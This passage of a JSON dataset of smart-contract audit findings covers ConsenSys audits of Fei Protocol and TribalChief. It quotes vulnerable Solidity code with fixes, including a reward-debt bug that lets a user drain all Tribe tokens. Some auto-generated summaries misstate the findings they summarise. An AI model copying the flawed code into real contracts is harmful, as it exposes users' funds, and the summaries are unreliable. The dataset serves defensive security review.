      "summary": "\nThe bug report is about the PCVDeposit contract not returning the correct amount of PCV and FEI in the resistantBalanceAndFei function. This function is used to evaluate the collateralization of the protocol, so it is important that it returns the correct values. \n\nThe problem is that the FEI tokens are transferred beforehand, so when depositing, all the FEI that are instantly becoming protocol-controlled and heavily impacting the collateralization rate. The opposite impact, but as much significant, happens during the withdrawal.\n\nTo solve this issue, two approaches are suggested. The first one is to make sure that the Fei transfers to/from the contract and the deposit/withdraw calls are happening in a single transaction. The second option is to consider all the FEI balance in the contract as the protocol-controlled FEI. Lastly, if the intention is to have all these FEI collateralized, the other solution is needed: make sure that `resistantBalanceAndFei` always returns `resistantFei` equals zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13298",
      "title": "StableSwapOperatorV1 - the _minLpOut value is not accurate",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nWhen depositing, the expected minimum amount of the output LP tokens is calculated:\n\n\n**code/contracts/pcv/curve/StableSwapOperatorV1.sol:L194-L200**\n\n\n\n```\n// slippage check on metapool deposit\nuint256 \\_balanceDeposited = IERC20(pool).balanceOf(address(this)) - \\_balanceBefore;\n{\n    uint256 \\_metapoolVirtualPrice = IStableSwap2(pool).get\\_virtual\\_price();\n    uint256 \\_minLpOut = (\\_feiToDeposit + \\_3crvBalanceAfter) \\* 1e18 / \\_metapoolVirtualPrice \\* (Constants.BASIS\\_POINTS\\_GRANULARITY - depositMaxSlippageBasisPoints) / Constants.BASIS\\_POINTS\\_GRANULARITY;\n    require(\\_balanceDeposited >= \\_minLpOut, \"StableSwapOperatorV1: metapool deposit slippage too high\");\n}\n\n```\nThe problem is that the `get_virtual_price` function returns a valid price only if the tokens in the pool are expected to have a price equal to $1 which is not the case. Also, the balances of deposited FEI and 3pool lp tokens are just added to each other while they have a different price: `_feiToDeposit + _3crvBalanceAfter`.\n\n\nThe price of the 3pool lp tokens is currently very close to 1$ so this difference is not that visible at the moment, but this can slowly change over time.",
      "summary": "\nThis bug report describes an issue with the StableSwapOperatorV1.sol code in the Curve PCV contracts. When depositing, the expected minimum amount of output LP tokens is calculated incorrectly. The `get_virtual_price` function returns a valid price only if the tokens in the pool are expected to have a price equal to $1, which is not the case. Additionally, the balances of deposited FEI and 3pool lp tokens are added together, even though they have different prices. This difference is not very noticeable at the moment, but it can cause issues over time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13297",
      "title": "CollateralizationOracle - Fei in excluded deposits contributes to userCirculatingFei",
      "impact": "HIGH",
      "content": "#### Description\n\n\n`CollateralizationOracle.pcvStats` iterates over all deposits, queries the resistant balance and FEI for each deposit, and accumulates the total value of the resistant balances and the total resistant FEI. Any Guardian or Governor can exclude (and re-include) a deposit that has become problematic in some way, for example, because it is reporting wrong numbers.\nFinally, the `pcvStats` function computes the `userCirculatingFei` as the total FEI supply minus the accumulated resistant FEI balances; the idea here is to determine the amount of “free” FEI, or FEI that is not PCV. However, the FEI balances from excluded deposits contribute to the `userCirculatingFei`, although they are clearly not “free” FEI. That leads to a wrong `protocolEquity` and a skewed collateralization ratio and might therefore have a significant impact on the economics of the system.\n\n\nIt should be noted that even the exclusion from the total PCV leads to a `protocolEquity` and a collateralization ratio that could be considered skewed (again, it might depend on the exact reasons for exclusion), but “adding” the missing FEI to the `userCirculatingFei` distorts these numbers even more.\n\n\nIn the extreme scenario that *all* deposits have been excluded, the entire Fei supply is currently reported as `userCirculatingFei`.\n\n\n**code/contracts/oracle/CollateralizationOracle.sol:L278-L328**\n\n\n\n```\n/// @notice returns the Protocol-Controlled Value, User-circulating FEI, and\n/// Protocol Equity.\n/// @return protocolControlledValue : the total USD value of all assets held\n/// by the protocol.\n/// @return userCirculatingFei : the number of FEI not owned by the protocol.\n/// @return protocolEquity : the difference between PCV and user circulating FEI.\n/// If there are more circulating FEI than $ in the PCV, equity is 0.\n/// @return validityStatus : the current oracle validity status (false if any\n/// of the oracles for tokens held in the PCV are invalid, or if\n/// this contract is paused).\nfunction pcvStats() public override view returns (\n  uint256 protocolControlledValue,\n  uint256 userCirculatingFei,\n  int256 protocolEquity,\n  bool validityStatus\n) {\n    uint256 \\_protocolControlledFei = 0;\n    validityStatus = !paused();\n\n    // For each token...\n    for (uint256 i = 0; i < tokensInPcv.length(); i++) {\n        address \\_token = tokensInPcv.at(i);\n        uint256 \\_totalTokenBalance  = 0;\n\n        // For each deposit...\n        for (uint256 j = 0; j < tokenToDeposits[\\_token].length(); j++) {\n            address \\_deposit = tokenToDeposits[\\_token].at(j);\n\n            // ignore deposits that are excluded by the Guardian\n            if (!excludedDeposits[\\_deposit]) {\n                // read the deposit, and increment token balance/protocol fei\n                (uint256 \\_depositBalance, uint256 \\_depositFei) = IPCVDepositBalances(\\_deposit).resistantBalanceAndFei();\n                \\_totalTokenBalance += \\_depositBalance;\n                \\_protocolControlledFei += \\_depositFei;\n            }\n        }\n\n        // If the protocol holds non-zero balance of tokens, fetch the oracle price to\n        // increment PCV by \\_totalTokenBalance \\* oracle price USD.\n        if (\\_totalTokenBalance != 0) {\n            (Decimal.D256 memory \\_oraclePrice, bool \\_oracleValid) = IOracle(tokenToOracle[\\_token]).read();\n            if (!\\_oracleValid) {\n                validityStatus = false;\n            }\n            protocolControlledValue += \\_oraclePrice.mul(\\_totalTokenBalance).asUint256();\n        }\n    }\n\n    userCirculatingFei = fei().totalSupply() - \\_protocolControlledFei;\n    protocolEquity = int256(protocolControlledValue) - int256(userCirculatingFei);\n}\n\n```\n#### Recommendation\n\n\nIt is unclear how to fix this. One might want to exclude the FEI in excluded deposits *entirely* from the calculation, but not knowing the amount was the reason to exclude the deposit in the first place.  \n\nOne option could be to let the entity that excludes a deposit specify substitute values that should be used instead of querying the numbers from the deposit. However, it is questionable whether this approach is practical if the numbers we’d like to see as substitute values change quickly or repeatedly over time. Ultimately, the querying function itself should be fixed. Moreover, as the substitute values can dramatically impact the system economics, we’d only like to trust the Governor with this and not give this permission to a Guardian. However, the original intention was to give a role with less trust than the Governor the possibility to react quickly to a deposit that reports wrong numbers; if the exclusion of deposits becomes the Governor’s privilege, such a quick and lightweight intervention isn’t possible anymore.\n\n\nIndependently, we recommend taking proper care of the situation that *all* deposits – or just too many – have been excluded, for example, by setting the returned `validityStatus` to `false`, as in this case, there is not enough information to compute the collateralization ratio even as a crude approximation.",
      "summary": "\nA bug has been identified in the `CollateralizationOracle.pcvStats` function in the code/contracts/oracle/CollateralizationOracle.sol file, which is used to calculate Protocol-Controlled Value (PCV), User-circulating FEI, and Protocol Equity. This bug is caused by the FEI balances from excluded deposits being added to the `userCirculatingFei`, which distorts the numbers and skews the collateralization ratio. In extreme scenarios, where all deposits have been excluded, the entire Fei supply is reported as `userCirculatingFei`.\n\nIt is unclear how to fix this bug, as the querying function should be fixed and the substitute values should be trusted to the Governor, not a Guardian. Moreover, proper care should be taken when *all* deposits (or just too many) have been excluded, for example, by setting the returned `validityStatus` to `false`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13296",
      "title": "StableSwapOperatorV1 - resistantFei value is not correct in the resistantBalanceAndFei function",
      "impact": "HIGH",
      "content": "#### Description\n\n\nThe `resistantBalanceAndFei` function of a `PCVDeposit` contract is supposed to return the amount of funds that the contract controls; it is then used to evaluate the total value of PCV (collateral in the protocol). Additionally, this function returns the number of FEI tokens that are protocol-controlled. These FEI tokens are “temporarily minted”; they are not backed up by the collateral and shouldn’t be used in calculations that determine the collateralization of the protocol.\n\n\nIdeally, the amount of these FEI tokens should be the same during the deposit, withdrawal, and the `resistantBalanceAndFei` function call. In the `StableSwapOperatorV1`  contract, all these values are totally different:\n\n\n* during the deposit, the amount of required FEI tokens is calculated. It’s done in a way so the values of FEI and 3pool tokens in the metapool should be equal after the deposit. So if there is the initial imbalance of FEI and 3pool tokens, the deposit value of these tokens will be different:\n\n\n**code/contracts/pcv/curve/StableSwapOperatorV1.sol:L156-L171**\n\n\n\n```\n// get the amount of tokens in the pool\n(uint256 \\_3crvAmount, uint256 \\_feiAmount) = (\n    IStableSwap2(pool).balances(\\_3crvIndex),\n    IStableSwap2(pool).balances(\\_feiIndex)\n);\n// ... and the expected amount of 3crv in it after deposit\nuint256 \\_3crvAmountAfter = \\_3crvAmount + \\_3crvBalanceAfter;\n \n// get the usd value of 3crv in the pool\nuint256 \\_3crvUsdValue = \\_3crvAmountAfter \\* IStableSwap3(\\_3pool).get\\_virtual\\_price() / 1e18;\n \n// compute the number of FEI to deposit\nuint256 \\_feiToDeposit = 0;\nif (\\_3crvUsdValue > \\_feiAmount) {\n    \\_feiToDeposit = \\_3crvUsdValue - \\_feiAmount;\n}\n\n```\n* during the withdrawal, the FEI and 3pool tokens are withdrawn in the same proportion as they are present in the metapool:\n\n\n**code/contracts/pcv/curve/StableSwapOperatorV1.sol:L255-L258**\n\n\n\n```\nuint256[2] memory \\_minAmounts; // [0, 0]\nIERC20(pool).approve(pool, \\_lpToWithdraw);\nuint256 \\_3crvBalanceBefore = IERC20(\\_3crv).balanceOf(address(this));\nIStableSwap2(pool).remove\\_liquidity(\\_lpToWithdraw, \\_minAmounts);\n\n```\n* in the `resistantBalanceAndFei` function, the value of protocol-controlled FEI tokens and the value of 3pool tokens deposited are considered equal:\n\n\n**code/contracts/pcv/curve/StableSwapOperatorV1.sol:L348-L349**\n\n\n\n```\nresistantBalance = \\_lpPriceUSD / 2;\nresistantFei = resistantBalance;\n\n```\n\n\nSome of these values may be equal under some circumstances, but that is not enforced. After one of the steps (deposit or withdrawal), the total PCV value and collateralization may be changed significantly.\n\n\n#### Recommendation\n\n\nMake sure that deposit, withdrawal, and the `resistantBalanceAndFei` are consistent and won’t instantly change the PCV value significantly.",
      "summary": "\nThis bug report is about the `resistantBalanceAndFei` function of a `PCVDeposit` contract. This function is supposed to return the amount of funds that the contract controls and the number of FEI tokens that are protocol-controlled. These FEI tokens are “temporarily minted” and should not be used in calculations that determine the collateralization of the protocol.\n\nCurrently, the amount of these FEI tokens is different during the deposit, withdrawal, and the `resistantBalanceAndFei` function call. This can lead to a significant change in the total PCV value and collateralization after one of the steps (deposit or withdrawal).\n\nThe recommendation is to ensure that deposit, withdrawal, and the `resistantBalanceAndFei` are consistent and won’t instantly change the PCV value significantly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13295",
      "title": "The BalancerLBPSwapper may not have enough Tribe tokens",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhenever the `swap` function is called, it should re-initialize the Balancer pool that requires adding liquidity: 99% Fei and 1% Tribe. So the Tribe should initially be in the contract.\n\n\n**code\\_new/contracts/pcv/balancer/BalancerLBPSwapper.sol:L313-L325**\n\n\n\n```\nfunction \\_getTokensIn(uint256 spentTokenBalance) internal view returns(uint256[] memory amountsIn) {\n    amountsIn = new uint256[](2);\n\n    uint256 receivedTokenBalance = readOracle().mul(spentTokenBalance).mul(ONE\\_PERCENT).div(NINETY\\_NINE\\_PERCENT).asUint256();\n\n    if (address(assets[0]) == tokenSpent) {\n        amountsIn[0] = spentTokenBalance;\n        amountsIn[1] = receivedTokenBalance;\n    } else {\n        amountsIn[0] = receivedTokenBalance;\n        amountsIn[1] = spentTokenBalance;\n    }\n}\n\n```\nAdditionally, when the `swap` is called, and there is not enough FEI to re-initiate the Balancer auction, all the Tribe gets withdrawn. So the next time the `swap` is called, there is no Tribe in the contract again.\n\n\n**code\\_new/contracts/pcv/balancer/BalancerLBPSwapper.sol:L248-L249**\n\n\n\n```\n// 5. Send remaining tokenReceived to target\nIERC20(tokenReceived).transfer(tokenReceivingAddress, IERC20(tokenReceived).balanceOf(address(this)));\n\n```\n#### Recommendation\n\n\nCreate an automated mechanism that mints/transfers Tribe when it is needed in the swapper contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13294",
      "title": "Re-initialization of the Balancer pool is potentially possible",
      "impact": "LOW",
      "content": "#### Description\n\n\nInstead of creating a new Balancer pool for an auction every time, the same pool is getting re-used repeatedly.\nWhen this happens, the old liquidity is withdrawn, and if there is enough FEI in the contract, the weights are shifted pool is filled with new tokens.\nIf there is not enough FEI, the pool is left empty, and users can still interact with it. When there’s enough FEI again, it’s re-initialized again, which is not the intention:\n\n\n**code\\_new/contracts/pcv/balancer/BalancerLBPSwapper.sol:L180-L187**\n\n\n\n```\nuint256 bptTotal = pool.totalSupply();\nuint256 bptBalance = pool.balanceOf(address(this));\n\n// Balancer locks a small amount of bptTotal after init, so 0 bpt means pool needs initializing\nif (bptTotal == 0) {\n    \\_initializePool();\n    return;\n}\n\n```\nTheoretically, this will never happen because there should be minimal leftover liquidity tokens after the withdrawal. But we couldn’t strictly verify that fact because it requires looking into balancer code much deeper.\n\n\n#### Recommendation\n\n\nOne of the options would be only to allow re-using the pool in atomic transactions. So if there are not enough FEI tokens for the next auction, the `swap` transaction reverts. That will help with another issue ([issue 3.2](#the-balancerlbpswapper-may-not-have-enough-tribe-tokens)) too.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "32157",
      "title": "TribalChief - A wrong user.rewardDebt  value is calculated during the withdrawFromDeposit function call",
      "impact": "HIGH",
      "content": "#### Description\n\n\nWhen withdrawing a single deposit, the reward debt is updated:\n\n\n**contracts/staking/TribalChief.sol:L468-L474**\n\n\n\n```\nuint128 virtualAmountDelta = uint128( ( amount * poolDeposit.multiplier ) / SCALE_FACTOR );\n\n// Effects\npoolDeposit.amount -= amount;\nuser.rewardDebt = user.rewardDebt - toSigned128(user.virtualAmount * pool.accTribePerShare) / toSigned128(ACC_TRIBE_PRECISION);\nuser.virtualAmount -= virtualAmountDelta;\npool.virtualTotalSupply -= virtualAmountDelta;\n\n```\nInstead of the `user.virtualAmount` in reward debt calculation, the `virtualAmountDelta`  should be used.\nBecause of that bug, the reward debt is much lower than it would be, which means that the reward itself will be much larger during the harvest.\nBy making multiple deposit-withdraw actions, any user can steal all the Tribe tokens from the contract.\n\n\n#### Recommendation\n\n\nUse the `virtualAmountDelta` instead of the `user.virtualAmount`.",
      "summary": "\nThe report describes a bug in the TribalChief contract where the reward debt is not being updated correctly when a single deposit is withdrawn. This results in a lower reward debt and a larger reward for the user. The recommendation is to use the virtualAmountDelta instead of the user's virtualAmount to fix the bug. This bug can potentially allow a user to steal all the Tribe tokens from the contract by making multiple deposit-withdraw actions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        " David Oz Kashi\n                        ",
        "Sergii Kravchenko",
        " Martin Ortner"
      ]
    },
    {
      "id": "16403",
      "title": "TribalChief - Governor decrease of pool’s allocation point should unlock depositors’ funds",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhen the `TribalChief` governor decreases the ratio between the allocation point (`PoolInfo.allocPoint`) and the total allocation point (`totalAllocPoint`) for a specific pool (either be directly decreasing `PoolInfo.allocPoint` of a given pool, or by increasing this value for other pools), the total reward for this pool is decreased as well. Depositors should be able to withdraw their funds immediately after this kind of change.\n\n\n#### Examples\n\n\n**code/contracts/staking/TribalChief.sol:L252-L261**\n\n\n\n```\nfunction set(uint256 \\_pid, uint128 \\_allocPoint, IRewarder \\_rewarder, bool overwrite) public onlyGovernor {\n totalAllocPoint = (totalAllocPoint - poolInfo[\\_pid].allocPoint) + \\_allocPoint;\n poolInfo[\\_pid].allocPoint = \\_allocPoint.toUint64();\n\n if (overwrite) {\n rewarder[\\_pid] = \\_rewarder;\n }\n\n emit LogSetPool(\\_pid, \\_allocPoint, overwrite ? \\_rewarder : rewarder[\\_pid], overwrite);\n}\n\n```\n#### Recommendation\n\n\nMake sure that depositors’ funds are unlocked for pools that affected negatively by calling `TribalChief.set`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "16402",
      "title": "TribalChief - Unlocking users’ funds in a pool where a multiplier has been increased is missing",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nWhen a user deposits funds to a pool, the current multiplier in use for this pool is being stored **locally** for this deposit. The value that is used later in a withdrawal operation is the **local one**, and not the one that is changing when a `governor` calls `governorAddPoolMultiplier`. It means that a decrease in the multiplier value for a given pool does not affect users that already deposited, but an increase does. Users that had already deposited should have the right to withdraw their funds when the multiplier for their pool increases by the `governor`.\n\n\n#### Examples\n\n\n**code/contracts/staking/TribalChief.sol:L143-L158**\n\n\n\n```\nfunction governorAddPoolMultiplier(\n uint256 \\_pid,\n uint64 lockLength,\n uint64 newRewardsMultiplier\n) external onlyGovernor {\n PoolInfo storage pool = poolInfo[\\_pid];\n uint256 currentMultiplier = rewardMultipliers[\\_pid][lockLength];\n // if the new multplier is less than the current multiplier,\n // then, you need to unlock the pool to allow users to withdraw\n if (newRewardsMultiplier < currentMultiplier) {\n pool.unlocked = true;\n }\n rewardMultipliers[\\_pid][lockLength] = newRewardsMultiplier;\n\n emit LogPoolMultiplier(\\_pid, lockLength, newRewardsMultiplier);\n}\n\n```\n#### Recommendation\n\n\nReplace the `<` operator with `>` in `TribalChief` line 152.",
      "summary": "\nThis bug report is about the TribalChief.sol contract in the code/contracts/staking/ directory. It states that when a user deposits funds to a pool, the current multiplier in use for this pool is stored locally, and this value is used later in a withdrawal operation. The problem is that if the multiplier value for a given pool decreases, users that had already deposited are not affected. However, an increase in the multiplier value does not apply to them either. This means that users that had already deposited should have the right to withdraw their funds when the multiplier for their pool increases by the governor.\n\nThe recommendation is to replace the `<` operator with `>` in TribalChief line 152. This will ensure that users that had already deposited will have the right to withdraw their funds when the multiplier for their pool increases by the governor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13352",
      "title": "TribalChief - resetRewards should emit an event",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe method `resetRewards` silently resets a pools tribe allocation.\n\n\n#### Examples\n\n\n**code/contracts/staking/TribalChief.sol:L263-L275**\n\n\n\n```\n/// @notice Reset the given pool's TRIBE allocation to 0 and unlock the pool. Can only be called by the governor or guardian.\n/// @param \\_pid The index of the pool. See `poolInfo`. \nfunction resetRewards(uint256 \\_pid) public onlyGuardianOrGovernor {\n    // set the pool's allocation points to zero\n    totalAllocPoint = (totalAllocPoint - poolInfo[\\_pid].allocPoint);\n    poolInfo[\\_pid].allocPoint = 0;\n   \n    // unlock all staked tokens in the pool\n    poolInfo[\\_pid].unlocked = true;\n\n    // erase any IRewarder mapping\n    rewarder[\\_pid] = IRewarder(address(0));\n}\n\n```\n#### Recommendation\n\n\nFor transparency and to create an easily accessible audit trail of events consider emitting an event when resetting a pools allocation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13351",
      "title": "TribalChief - duplicate import SafeERC20",
      "impact": "LOW",
      "content": "#### Description\n\n\nDuplicate import for SafeERC20.\n\n\n#### Examples\n\n\n**code/contracts/staking/TribalChief.sol:L7-L8**\n\n\n\n```\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n```\n#### Recommendation\n\n\nRemove duplicate import line.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13350",
      "title": "TribalChief - new block reward retrospectively takes effect on pools that have not been updated recently",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhen the governor updates the block reward `tribalChiefTribePerBlock` the new reward is applied for the outstanding duration of blocks in `updatePool`. This means, if a pool hasn’t updated in a while (unlikely) the new block reward is retrospectively applied to the pending duration instead of starting from when the block reward changed.\n\n\n#### Examples\n\n\n* rewards calculation\n\n\n**code/contracts/staking/TribalChief.sol:L323-L327**\n\n\n\n```\nif (virtualSupply > 0) {\n    uint256 blocks = block.number - pool.lastRewardBlock;\n    uint256 tribeReward = (blocks \\* tribePerBlock() \\* pool.allocPoint) / totalAllocPoint;\n    pool.accTribePerShare = uint128(pool.accTribePerShare + ((tribeReward \\* ACC\\_TRIBE\\_PRECISION) / virtualSupply));\n}\n\n```\n* updating the block reward\n\n\n**code/contracts/staking/TribalChief.sol:L111-L116**\n\n\n\n```\n/// @notice Allows governor to change the amount of tribe per block\n/// @param newBlockReward The new amount of tribe per block to distribute\nfunction updateBlockReward(uint256 newBlockReward) external onlyGovernor {\n    tribalChiefTribePerBlock = newBlockReward;\n    emit NewTribePerBlock(newBlockReward);\n}\n\n```\n#### Recommendation\n\n\nIt is recommended to update pools before changing the block reward. Document and make users aware that the new reward is applied to the outstanding duration when calling `updatePool`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13349",
      "title": "TribalChief - Governor decrease of pool’s allocation point should unlock depositors' funds",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhen the `TribalChief` governor decreases the ratio between the allocation point (`PoolInfo.allocPoint`) and the total allocation point (`totalAllocPoint`) for a specific pool (either be directly decreasing `PoolInfo.allocPoint` of a given pool, or by increasing this value for other pools), the total reward for this pool is decreased as well. Depositors should be able to withdraw their funds immediately after this kind of change.\n\n\n#### Examples\n\n\n**code/contracts/staking/TribalChief.sol:L252-L261**\n\n\n\n```\nfunction set(uint256 \\_pid, uint128 \\_allocPoint, IRewarder \\_rewarder, bool overwrite) public onlyGovernor {\n    totalAllocPoint = (totalAllocPoint - poolInfo[\\_pid].allocPoint) + \\_allocPoint;\n    poolInfo[\\_pid].allocPoint = \\_allocPoint.toUint64();\n\n    if (overwrite) {\n        rewarder[\\_pid] = \\_rewarder;\n    }\n\n    emit LogSetPool(\\_pid, \\_allocPoint, overwrite ? \\_rewarder : rewarder[\\_pid], overwrite);\n}\n\n```\n#### Recommendation\n\n\nMake sure that depositors' funds are unlocked for pools that affected negatively by calling `TribalChief.set`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13348",
      "title": "EthCompoundPCVDeposit - should provide means to recover ETH",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\n`EthCompoundPCVDeposit` accepts `ETH` via `receive()`. Anyone can call `EthCompoundPCVDeposit.deposit()` to mint `CToken` for the contracts `ETH` balance.\n\n\nThe `CToken` to be used is configured on `EthCompoundPCVDeposit` deployment. It is not checked, whether the provided `CToken` address is actually a valid `CToken`.\n\n\nIf the configured `CToken` ceases to work correctly (e.g. `CToken.mint|redeem*` disabled or the configured `CToken` address is invalid), `ETH` held by the contract may be locked up.\n\n\n#### Recommendation\n\n\nSimilar to `EthLidoPCVDeposit` add a method `witdrawETH`, access-restricted to `onlyPCVController`, that allows recovering `ETH` from the `EthCompoundPCVDeposit` contract in case the `CToken` contract throws. (Consider moving this functionality to `PCVDeposit` where `withdrawERC20` is implemented to avoid having to implement this over and over again)\n\n\nIn `CompoundPCVDepositBase` consider verifying, that the `CToken` constructor argument is actually a valid `CToken` by checking `require(ctoken.isCToken(), \"not a valid CToken\")`.",
      "summary": "\nThis bug report is about the `EthCompoundPCVDeposit` contract which accepts ETH and allows users to mint CToken with it. The CToken to be used is configured on the contract's deployment, however, it is not checked whether the provided CToken address is actually a valid CToken. If the configured CToken ceases to work correctly, the ETH held by the contract may be locked up.\n\nThe recommendation is to add a method `withdrawETH` that is access-restricted to `onlyPCVController` and allows recovering ETH from the `EthCompoundPCVDeposit` contract in case the CToken contract throws. Additionally, the `CompoundPCVDepositBase` should verify that the CToken constructor argument is actually a valid CToken by checking `require(ctoken.isCToken(), \"not a valid CToken\")`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13347",
      "title": "TribalChief - Unsafe down-castings",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\n`TribalChief` consists of multiple unsafe down-casting operations. While the usage of types that can be packed into a single storage slot is more gas efficient, it may introduce hidden risks in some cases that can lead to loss of funds.\n\n\n#### Examples\n\n\nVarious instances in `TribalChief`, including (but not necessarily only) :\n\n\n**code/contracts/staking/TribalChief.sol:L429**\n\n\n\n```\nuser.rewardDebt = int128(user.virtualAmount \\* pool.accTribePerShare) / toSigned128(ACC\\_TRIBE\\_PRECISION);\n\n```\n**code/contracts/staking/TribalChief.sol:L326**\n\n\n\n```\npool.accTribePerShare = uint128(pool.accTribePerShare + ((tribeReward \\* ACC\\_TRIBE\\_PRECISION) / virtualSupply));\n\n```\n**code/contracts/staking/TribalChief.sol:L358**\n\n\n\n```\nuserPoolData.rewardDebt += int128(virtualAmountDelta \\* pool.accTribePerShare) / toSigned128(ACC\\_TRIBE\\_PRECISION);\n\n```\n#### Recommendation\n\n\nGiven the time constraints of this audit engagement, we could not verify the implications and provide mitigation actions for each of the unsafe down-castings operations. However, we do recommend to either use numeric types that use 256 bits, or to add proper validation checks and handle these scenarios to avoid silent over/under-flow errors. Keep in mind that reverting these scenarios can sometimes lead to a denial of service, which might be harmful in some cases.",
      "summary": "\nThe bug report is about TribalChief, a smart contract, which contains multiple unsafe down-casting operations. These operations can be more gas efficient but they can also lead to loss of funds if not done properly. Examples of such operations were provided in the report. The audit team could not verify the implications and provide mitigation actions due to time constraints. They recommended using numeric types that use 256 bits, or to add proper validation checks and handle scenarios to avoid silent over/under-flow errors. Reverting these scenarios can sometimes lead to a denial of service, which might be harmful in some cases.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
